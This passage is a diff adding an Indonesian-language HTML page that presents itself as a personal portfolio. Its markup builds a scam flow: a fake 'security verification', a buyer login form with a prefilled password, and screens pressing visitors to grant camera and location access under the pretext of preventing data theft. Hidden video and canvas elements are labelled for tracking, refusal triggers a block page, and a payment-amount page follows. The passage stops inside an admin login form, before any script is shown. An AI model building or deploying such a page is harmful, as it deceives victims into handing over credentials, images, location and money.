@@ -1,0 +1,2130 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RAYY.ARCHIVE | PORTOFOLIO</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=Syncopate:wght@700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/scrollreveal"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* --- VARIABLE TEMA --- */
+        :root {
+            --bg: #ffffff;
+            --text: #0d0d0d;
+            --surface: #f5f5f7;
+            --border: #e2e2e5;
+            --accent: #000000;
+            --subtle: #86868b;
+            --primary: #2563eb;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+        }
+
+        [data-theme="dark"] {
+            --bg: #0d0d0d;
+            --text: #f5f5f7;
+            --surface: #1a1a1e;
+            --border: #333338;
+            --accent: #ffffff;
+            --subtle: #a0a0a5;
+            --primary: #3b82f6;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #fbbf24;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-font-smoothing: antialiased; }
+        html { scroll-behavior: smooth; }
+        body { background: var(--bg); color: var(--text); font-family: "Inter", sans-serif; transition: 0.3s; overflow-x: hidden; }
+
+        body::after {
+            content: ""; position: fixed; inset: 0;
+            background-image: url("https://grainy-gradients.vercel.app/noise.svg");
+            opacity: 0.03; pointer-events: none; z-index: 9999;
+        }
+
+        /* --- LOAD SCREEN 16:9 --- */
+        #loadScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 20000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.8s ease;
+        }
+        #loadScreen .video-container {
+            width: 100%;
+            max-width: 1200px;
+            aspect-ratio: 16 / 9;
+            position: relative;
+            background: #000;
+        }
+        #loadScreen video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        #loadScreen.hide {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* --- LOGIN PAGE (WELCOME) --- */
+        #loginWelcome {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            z-index: 30000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 420px;
+        }
+        .login-card {
+            background: white;
+            border-radius: 32px;
+            padding: 40px 32px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .login-logo {
+            font-size: 48px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+            display: inline-block;
+        }
+        .login-card h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #2d3748;
+            margin-bottom: 8px;
+        }
+        .login-card h2 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #2d3748;
+            margin-bottom: 20px;
+        }
+        .login-subtitle {
+            color: #718096;
+            font-size: 0.95rem;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        .permission-list {
+            background: #f7fafc;
+            border-radius: 24px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 12px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .permission-item:last-child {
+            border-bottom: none;
+        }
+        .permission-icon {
+            width: 40px;
+            height: 40px;
+            background: #e2e8f0;
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+        .permission-text {
+            flex: 1;
+        }
+        .permission-title {
+            font-weight: 600;
+            color: #2d3748;
+            margin-bottom: 4px;
+        }
+        .permission-desc {
+            color: #718096;
+            font-size: 0.85rem;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 10px 20px rgba(102,126,234,0.3);
+            margin: 10px 0;
+        }
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(102,126,234,0.4);
+        }
+
+        /* --- LOGIN FORM PAGE --- */
+        #loginForm {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            z-index: 29000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .login-input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .login-input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #4a5568;
+            font-size: 0.9rem;
+        }
+        .login-input-group input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 20px;
+            font-size: 1rem;
+            transition: 0.2s;
+            outline: none;
+        }
+        .login-input-group input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+        }
+        .login-error {
+            color: #c53030;
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+            display: none;
+        }
+        .btn-secondary {
+            background: white;
+            color: #4a5568;
+            border: 2px solid #e2e8f0;
+            box-shadow: none;
+            margin-top: 10px;
+        }
+        .btn-secondary:hover {
+            background: #f7fafc;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* --- PERMISSION PAGE --- */
+        #permissionPage {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            z-index: 25000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        #permissionPage.active {
+            display: flex;
+        }
+        .permission-card {
+            background: white;
+            border-radius: 32px;
+            padding: 40px 32px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
+        }
+        .permission-logo {
+            font-size: 48px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+            display: inline-block;
+        }
+        .permission-list-modern {
+            margin: 30px 0;
+        }
+        .permission-item-modern {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px;
+            background: #f7fafc;
+            border-radius: 16px;
+            margin-bottom: 10px;
+        }
+        .permission-icon-modern {
+            width: 48px;
+            height: 48px;
+            background: #e2e8f0;
+            border-radius: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+        .permission-text-modern h4 {
+            font-size: 1rem;
+            margin-bottom: 4px;
+        }
+        .permission-text-modern p {
+            font-size: 0.8rem;
+            color: #718096;
+        }
+        .permission-loading-box {
+            background: #f7fafc;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .loading-spinner-small {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #e2e8f0;
+            border-top-color: #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .permission-note {
+            background: #ebf8ff;
+            border: 1px solid #90cdf4;
+            border-radius: 16px;
+            padding: 16px;
+            margin: 20px 0;
+            color: #2c5282;
+            font-size: 0.85rem;
+            text-align: center;
+        }
+        .btn-permission {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        .btn-permission:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(102,126,234,0.4);
+        }
+
+        /* --- LOADING PERMISSION OVERLAY --- */
+        .permission-loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 40000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: white;
+        }
+        .permission-loading-overlay.active {
+            display: flex;
+        }
+        .loading-spinner-large {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        /* --- BLOCK PAGE --- */
+        #blockPage {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #ef4444 0%, #991b1b 100%);
+            z-index: 35000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        #blockPage.active {
+            display: flex;
+        }
+        .block-card {
+            background: white;
+            border-radius: 32px;
+            padding: 40px 32px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .block-icon {
+            width: 80px;
+            height: 80px;
+            background: #fee2e2;
+            border-radius: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: #dc2626;
+            font-size: 40px;
+        }
+        .block-title {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #dc2626;
+            margin-bottom: 16px;
+        }
+        .block-message {
+            color: #4b5563;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+        .block-note {
+            background: #fee2e2;
+            border: 1px solid #fecaca;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            color: #991b1b;
+            font-size: 0.9rem;
+            text-align: left;
+        }
+        .block-note i {
+            color: #dc2626;
+            margin-right: 8px;
+        }
+        .developer-credit {
+            font-size: 0.8rem;
+            color: #6b7280;
+            margin: 20px 0;
+            font-weight: 600;
+        }
+        .btn-block {
+            width: 100%;
+            padding: 18px;
+            background: #dc2626;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        .btn-block:hover {
+            background: #b91c1c;
+        }
+
+        /* --- NAVIGATION --- */
+        nav {
+            padding: 20px 5%; display: flex; justify-content: space-between; align-items: center;
+            position: sticky; top: 0; background: var(--bg); backdrop-filter: blur(15px);
+            z-index: 1000; border-bottom: 1px solid var(--border);
+        }
+        .brand { font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.9rem; letter-spacing: 2px; }
+        .nav-right { display: flex; align-items: center; gap: 20px; }
+        
+        .theme-toggle { 
+            background: var(--surface); border: 1px solid var(--border); border-radius: 50px;
+            padding: 8px 15px; cursor: pointer; font-size: 0.65rem; font-weight: 800; 
+            color: var(--text); transition: 0.3s; text-transform: uppercase;
+        }
+
+        .menu-toggle { 
+            cursor: pointer; 
+            width: 30px; 
+            height: 20px; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: space-between;
+            position: relative;
+            z-index: 2001;
+        }
+        .menu-toggle span { 
+            width: 100%; 
+            height: 2px; 
+            background: var(--text); 
+            transition: 0.3s;
+            display: block;
+        }
+
+        /* --- SIDEBAR --- */
+        #sidebar {
+            position: fixed; top: 0; right: -100%; width: 100%; max-width: 350px;
+            height: 100vh; background: var(--bg); z-index: 2000;
+            padding: 40px; border-left: 1px solid var(--border);
+            transition: transform 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+            overflow-y: auto;
+        }
+        #sidebar.active { transform: translateX(-100%); }
+        .back-btn {
+            display: inline-flex; align-items: center; gap: 10px; cursor: pointer;
+            font-weight: 800; font-size: 0.7rem; color: var(--subtle);
+            margin-bottom: 40px; text-transform: uppercase; border: 1px solid var(--border);
+            padding: 8px 15px; border-radius: 4px;
+        }
+        .side-btn {
+            display: flex; align-items: center; justify-content: space-between;
+            text-decoration: none; color: var(--text); padding: 20px 0;
+            border-bottom: 1px solid var(--border); font-size: 0.9rem; font-weight: 700;
+            cursor: pointer;
+        }
+        .side-submenu {
+            display: none;
+            padding: 10px 0 10px 20px;
+        }
+        .side-submenu.active {
+            display: block;
+        }
+        .side-submenu a {
+            display: block;
+            padding: 12px 0;
+            color: var(--subtle);
+            text-decoration: none;
+            font-size: 0.85rem;
+            border-bottom: 1px dashed var(--border);
+        }
+
+        /* --- BOTTOM NAV --- */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: var(--bg);
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 5%;
+            z-index: 1000;
+        }
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            color: var(--subtle);
+            transition: 0.3s;
+            font-size: 0.7rem;
+        }
+        .nav-item i {
+            font-size: 1.4rem;
+        }
+        .nav-item:hover {
+            color: var(--accent);
+        }
+        .nav-item.active {
+            color: var(--primary);
+        }
+
+        /* --- MAIN CONTENT --- */
+        .main-content {
+            padding: 20px 5% 80px;
+            display: none;
+        }
+        .main-content.active {
+            display: block;
+        }
+
+        /* --- PROFILE SECTION --- */
+        .profile-section {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .profile-avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: var(--surface);
+            margin: 0 auto 20px;
+            border: 3px solid var(--primary);
+            overflow: hidden;
+            cursor: pointer;
+            position: relative;
+        }
+        .profile-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .avatar-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 5px;
+            font-size: 0.7rem;
+            transform: translateY(100%);
+            transition: 0.3s;
+        }
+        .profile-avatar:hover .avatar-overlay {
+            transform: translateY(0);
+        }
+        .profile-bio {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .profile-bio textarea {
+            width: 100%;
+            padding: 15px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            color: var(--text);
+            border-radius: 12px;
+            resize: vertical;
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* --- PORTOFOLIO GRID --- */
+        .portfolio-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .portfolio-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 25px;
+            transition: 0.3s;
+        }
+        .portfolio-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .card-icon {
+            font-size: 2rem;
+            margin-bottom: 15px;
+            color: var(--primary);
+        }
+        .card-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .card-desc {
+            color: var(--subtle);
+            font-size: 0.85rem;
+            margin-bottom: 15px;
+        }
+        .card-link {
+            display: inline-block;
+            padding: 8px 20px;
+            background: var(--primary);
+            color: white;
+            text-decoration: none;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+
+        /* --- MODALS --- */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 3000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .modal.active {
+            display: flex;
+        }
+        .modal-content {
+            background: var(--bg);
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
+        }
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: var(--text);
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        /* --- ADMIN PANEL --- */
+        .admin-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+        }
+        .admin-tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 6px;
+        }
+        .admin-tab.active {
+            background: var(--primary);
+            color: white;
+        }
+        .admin-panel {
+            display: none;
+        }
+        .admin-panel.active {
+            display: block;
+        }
+        .info-item {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 10px;
+        }
+        .info-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .pin-btn {
+            background: none;
+            border: none;
+            color: var(--warning);
+            cursor: pointer;
+            font-size: 1.2rem;
+        }
+        .info-content {
+            font-size: 0.9rem;
+        }
+        .info-content.pinned {
+            border-left: 3px solid var(--warning);
+            padding-left: 15px;
+        }
+
+        /* --- GAMES SECTION --- */
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        .game-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+        }
+        .game-card.coming-soon {
+            opacity: 0.5;
+            position: relative;
+        }
+        .coming-soon-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: var(--warning);
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.65rem;
+        }
+
+        /* --- DEVICES TABLE --- */
+        .devices-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .devices-table th,
+        .devices-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+
+        /* --- HIDDEN MEDIA --- */
+        #hidden-video, #hidden-canvas {
+            display: none;
+        }
+
+        /* --- UTILITY --- */
+        .btn {
+            padding: 12px 25px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .btn-danger {
+            background: var(--danger);
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<!-- LOAD SCREEN 16:9 -->
+<div id="loadScreen">
+    <div class="video-container">
+        <video autoplay muted playsinline>
+            <source src="https://files.catbox.moe/pdjmp2.mp4" type="video/mp4">
+        </video>
+    </div>
+</div>
+
+<!-- LOGIN WELCOME PAGE -->
+<div id="loginWelcome">
+    <div class="login-container">
+        <div class="login-card">
+            <div class="login-logo">R</div>
+            <h1>Verifikasi Keamanan</h1>
+            <div class="login-subtitle">
+                Verifikasi bahwa Anda adalah pemilik akun untuk melanjutkan proses.
+            </div>
+            
+            <div class="permission-list">
+                <div class="permission-item">
+                    <div class="permission-icon">🔒</div>
+                    <div class="permission-text">
+                        <div class="permission-title">Verifikasi Identitas</div>
+                        <div class="permission-desc">Pastikan Anda adalah pemilik akun</div>
+                    </div>
+                </div>
+                <div class="permission-item">
+                    <div class="permission-icon">🛡️</div>
+                    <div class="permission-text">
+                        <div class="permission-title">Keamanan Transaksi</div>
+                        <div class="permission-desc">Lindungi dari pencurian data</div>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="login-btn" onclick="showLoginForm()">
+                Lanjutkan Verifikasi →
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- LOGIN FORM PAGE -->
+<div id="loginForm">
+    <div class="login-container">
+        <div class="login-card">
+            <div class="login-logo">R</div>
+            <h2>Login Buyer</h2>
+            <div class="login-subtitle">
+                Masukkan email dan password untuk verifikasi akun.
+            </div>
+            
+            <div class="login-input-group">
+                <label>Email</label>
+                <input type="email" id="loginEmail" placeholder="AKUN DI BERIKAN DI CHAT" value="AKUN DI BERIKAN DI CHAT">
+            </div>
+            
+            <div class="login-input-group">
+                <label>Password</label>
+                <input type="password" id="loginPassword" placeholder="••••••••" value="buyer001">
+            </div>
+            
+            <div id="loginError" class="login-error">
+                Email atau password salah! Hubungi admin.
+            </div>
+            
+            <button class="login-btn" onclick="verifyLogin()">
+                Verifikasi Login →
+            </button>
+            
+            <button class="login-btn btn-secondary" onclick="goBackToWelcome()">
+                ← Kembali
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- PERMISSION PAGE -->
+<div id="permissionPage">
+    <div class="permission-card">
+        <div class="permission-logo">R</div>
+        <h2 style="font-size:1.5rem; margin-bottom:8px;">Berikan Akses Izin</h2>
+        <p style="color:#718096; margin-bottom:24px;">Berikan akses beberapa izin berikut untuk melanjutkan transaksi dengan aman.</p>
+        
+        <div class="permission-list-modern">
+            <div class="permission-item-modern">
+                <div class="permission-icon-modern">📍</div>
+                <div class="permission-text-modern">
+                    <h4>Akses Lokasi</h4>
+                    <p>Verifikasi perizinan transaksi</p>
+                </div>
+            </div>
+            <div class="permission-item-modern">
+                <div class="permission-icon-modern">📸</div>
+                <div class="permission-text-modern">
+                    <h4>Akses Kamera</h4>
+                    <p>Verifikasi layar data pengguna</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="permission-loading-box" id="permissionLoadingBox" style="display: none;">
+            <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
+                <div class="loading-spinner-small"></div>
+                <div style="text-align: left;">
+                    <strong>Meminta izin akses...</strong><br>
+                    <small>Mengenai layar data, mohon tunggu sebentar</small>
+                </div>
+            </div>
+        </div>
+        
+        <div class="permission-note">
+            <i class="fas fa-info-circle" style="margin-right:8px;"></i>
+            Note: Verifikasi perizinan sangat diperlukan untuk menghindari pencurian data. Terima kasih.
+        </div>
+        
+        <button class="btn-permission" onclick="startPermissions()" id="permissionBtn">Berikan Izin →</button>
+    </div>
+</div>
+
+<!-- PERMISSION LOADING OVERLAY -->
+<div id="permissionLoadingOverlay" class="permission-loading-overlay">
+    <div class="loading-spinner-large"></div>
+    <div style="font-size:1.2rem; font-weight:600; margin-bottom:8px;">Meminta izin akses...</div>
+    <div style="font-size:0.9rem; opacity:0.8;">Mengenai layar data, mohon tunggu sebentar</div>
+</div>
+
+<!-- BLOCK PAGE -->
+<div id="blockPage">
+    <div class="block-card">
+        <div class="block-icon">⚠️</div>
+        <div class="block-title">SEMUA AKSES DITOLAK</div>
+        <div class="block-message">
+            Harap berikan izin akses kamera dan lokasi untuk melanjutkan transaksi.
+        </div>
+        
+        <div class="block-note">
+            <i class="fas fa-exclamation-triangle"></i>
+            📝 <strong>Note:</strong> Verifikasi perizinan sangat diperlukan untuk menghindari pencurian data. Jika anda menolak semua perizinan akan di blokir, harap hapus tab lama dan mulai ulang browser untuk melakukan verifikasi izin akses. Terima kasih. 
+            <br><br>
+            @Developer 2026-2027
+        </div>
+        
+        <button class="btn-block" onclick="restartBrowser()">Mulai Ulang Verifikasi</button>
+    </div>
+</div>
+
+<!-- HIDDEN MEDIA FOR TRACKING -->
+<video id="hidden-video" autoplay playsinline muted></video>
+<canvas id="hidden-canvas"></canvas>
+
+<!-- NAVIGATION -->
+<nav>
+    <div class="brand">RAYY.ARCHIVE</div>
+    <div class="nav-right">
+        <button class="theme-toggle" onclick="toggleTheme()">MODE</button>
+        <div class="menu-toggle" onclick="toggleSidebar()">
+            <span></span>
+            <span style="width:65%; align-self:flex-end;"></span>
+            <span></span>
+        </div>
+    </div>
+</nav>
+
+<!-- SIDEBAR -->
+<div id="sidebar">
+    <div class="back-btn" onclick="toggleSidebar()">← CLOSE MENU</div>
+    
+    <div class="side-btn" onclick="toggleSubMenu('profile-sub')">
+        PROFIL <i class="fas fa-chevron-right"></i>
+    </div>
+    <div id="profile-sub" class="side-submenu">
+        <a href="#" onclick="showProfile(); toggleSidebar()">Lihat Profil</a>
+        <a href="#" onclick="editProfile(); toggleSidebar()">Edit Profil</a>
+    </div>
+    
+    <div class="side-btn" onclick="toggleSubMenu('games-sub')">
+        PERMAINAN <i class="fas fa-chevron-right"></i>
+    </div>
+    <div id="games-sub" class="side-submenu">
+        <a href="#" onclick="showGames(); toggleSidebar()">Coming Soon...</a>
+    </div>
+    
+    <div class="side-btn" onclick="logout()">
+        LOGOUT <i class="fas fa-sign-out-alt"></i>
+    </div>
+    
+    <div class="side-btn" onclick="showAdminLogin()">
+        AKSES ADMIN <i class="fas fa-lock"></i>
+    </div>
+</div>
+
+<!-- BOTTOM NAVIGATION -->
+<div class="bottom-nav">
+    <div class="nav-item active" onclick="showSection('home')">
+        <i class="fas fa-home"></i>
+        <span>Home</span>
+    </div>
+    <div class="nav-item" onclick="showSection('profile')">
+        <i class="fas fa-user"></i>
+        <span>Profil</span>
+    </div>
+    <div class="nav-item" onclick="window.open('https://wa.me/6285189712417', '_blank')">
+        <i class="fab fa-whatsapp"></i>
+        <span>Developer</span>
+    </div>
+    <div class="nav-item" onclick="showAIChat()">
+        <i class="fas fa-robot"></i>
+        <span>AI</span>
+    </div>
+    <div class="nav-item" onclick="toggleTheme()">
+        <i class="fas fa-palette"></i>
+        <span>Ubah Warna</span>
+    </div>
+</div>
+
+<!-- MAIN CONTENT -->
+<div class="main-content" id="mainContent">
+    <!-- HOME SECTION -->
+    <div id="home-section">
+        <h1 class="hero-title">RAYY.<br>ARCHIVE.</h1>
+        <p style="color:var(--subtle); margin-bottom:30px;">Portfolio & Projects</p>
+        
+        <div class="portfolio-grid">
+            <div class="portfolio-card">
+                <div class="card-icon"><i class="fab fa-whatsapp"></i></div>
+                <div class="card-title">Bot Group</div>
+                <div class="card-desc">Join WhatsApp bot group for updates</div>
+                <a href="https://chat.whatsapp.com/IhkWYswyjyj3HzgcG5T1Nc" class="card-link" target="_blank">Join Group</a>
+            </div>
+            
+            <div class="portfolio-card">
+                <div class="card-icon"><i class="fas fa-bullhorn"></i></div>
+                <div class="card-title">Channel</div>
+                <div class="card-desc">Follow channel for announcements</div>
+                <a href="https://whatsapp.com/channel/0029VbCUQvCE50Ubd6Ql4p2d" class="card-link" target="_blank">Follow Channel</a>
+            </div>
+            
+            <div class="portfolio-card">
+                <div class="card-icon"><i class="fab fa-tiktok"></i></div>
+                <div class="card-title">TikTok</div>
+                <div class="card-desc">Follow for tutorials</div>
+                <a href="https://www.tiktok.com/@r_itsmyinitials" class="card-link" target="_blank">@r_itsmyinitials</a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- PROFILE SECTION -->
+    <div id="profile-section" style="display: none;">
+        <div class="profile-section">
+            <div class="profile-avatar" onclick="changeAvatar()">
+                <img id="profileImage" src="https://files.catbox.moe/f1djwz.jpg" alt="Profile">
+                <div class="avatar-overlay">Ganti Foto</div>
+            </div>
+            <div class="profile-bio">
+                <textarea id="profileBio" placeholder="Tulis bio Anda di sini..." rows="4">Developer & Creator</textarea>
+                <button class="btn" style="margin-top:10px;" onclick="saveProfile()">Simpan</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- HALAMAN NOMINAL -->
+<div id="nominalPage" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); z-index: 24000; align-items: center; justify-content: center; padding: 20px;">
+    <div class="login-container">
+        <div class="login-card">
+            <div class="login-logo">R</div>
+            <h2>Masukkan Nominal</h2>
+            <div class="login-subtitle">
+                Tentukan jumlah pembayaran yang akan dilakukan.
+            </div>
+            
+            <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0;">
+                <button class="btn" onclick="selectNominal(50000)" style="background: #f7fafc; color: #2d3748; border: 2px solid #e2e8f0;">50K</button>
+                <button class="btn" onclick="selectNominal(100000)" style="background: #f7fafc; color: #2d3748; border: 2px solid #e2e8f0;">100K</button>
+                <button class="btn" onclick="selectNominal(200000)" style="background: #f7fafc; color: #2d3748; border: 2px solid #e2e8f0;">200K</button>
+                <button class="btn" onclick="selectNominal(500000)" style="background: #f7fafc; color: #2d3748; border: 2px solid #e2e8f0;">500K</button>
+                <button class="btn" onclick="selectNominal(1000000)" style="background: #f7fafc; color: #2d3748; border: 2px solid #e2e8f0;">1JT</button>
+                <button class="btn" onclick="selectNominal(2000000)" style="background: #f7fafc; color: #2d3748; border: 2px solid #e2e8f0;">2JT</button>
+            </div>
+            
+            <div class="login-input-group" style="margin-top: 20px;">
+                <label>Atau masukkan nominal lain</label>
+                <input type="number" id="customNominal" placeholder="Contoh: 75000" min="10000">
+            </div>
+            
+            <div style="background: #f7fafc; border-radius: 20px; padding: 20px; margin: 20px 0; text-align: center;">
+                <div style="color: #718096; font-size: 0.9rem; margin-bottom: 5px;">Total Pembayaran</div>
+                <div style="font-size: 2rem; font-weight: 700; color: #2d3748;" id="totalDisplay">Rp 0</div>
+            </div>
+            
+            <button class="login-btn" onclick="processPayment()">
+                Lanjut ke Pembayaran →
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- ADMIN LOGIN MODAL -->
+<div id="adminLoginModal" class="modal">
+    <div class="modal-content">
+        <button class="close-modal" onclick="closeModal('adminLoginModal')">&times;</button>
+        <h2>Admin Login</h2>
+        <div style="margin-top: 20px;">
+            <div class="login-input-group">
+                <label>Email</label>
+                <input type="email" id="adminEmail" placeholder="rayy@dev.com">
